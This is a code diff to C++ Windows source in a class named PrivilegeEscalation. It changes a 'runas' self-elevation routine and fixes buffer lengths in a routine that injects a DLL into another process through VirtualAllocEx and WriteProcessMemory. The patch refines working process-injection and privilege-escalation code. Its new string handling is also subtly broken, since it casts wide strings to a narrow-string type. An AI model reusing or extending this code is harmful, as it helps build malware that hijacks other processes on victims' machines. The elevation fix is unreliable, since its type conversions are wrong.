@@ -9,6 +9,7 @@
 #include <sddl.h>
 #include <accctrl.h>
 #include <aclapi.h>
+#include <shellapi.h>  // Add this header for ShellExecuteEx
 #include <string>
 #include <vector>
 
@@ -109,8 +110,11 @@ bool PrivilegeEscalation::CreateElevatedProcess() {
     SHELLEXECUTEINFO sei = { sizeof(sei) };
     std::string exePath = utils::FileUtils::GetCurrentExecutablePath();
 
-    sei.lpVerb = L"runas";
-    sei.lpFile = (LPCWSTR)exePath.c_str();
+    // Convert std::string to LPCWSTR
+    std::wstring wideExePath(exePath.begin(), exePath.end());
+    
+    sei.lpVerb = reinterpret_cast<LPCSTR>(L"runas");
+    sei.lpFile = reinterpret_cast<LPCSTR>(wideExePath.c_str());
     sei.hwnd = NULL;
     sei.nShow = SW_NORMAL;
 
@@ -139,7 +143,7 @@ bool PrivilegeEscalation::InjectIntoProcess(DWORD pid) {
 
     // Allocate memory in the target process
     std::string dllPath = utils::FileUtils::GetCurrentModulePath();
-    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, dllPath.length(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteMem) {
         LOG_ERROR("VirtualAllocEx failed: " + std::to_string(GetLastError()));
         CloseHandle(hProcess);
@@ -147,7 +151,7 @@ bool PrivilegeEscalation::InjectIntoProcess(DWORD pid) {
     }
 
     // Write the DLL path to the target process
-    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath.c_str(), dllPath.length(), NULL)) {
+    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath.c_str(), dllPath.length() + 1, NULL)) {
         LOG_ERROR("WriteProcessMemory failed: " + std::to_string(GetLastError()));
         VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
         CloseHandle(hProcess);
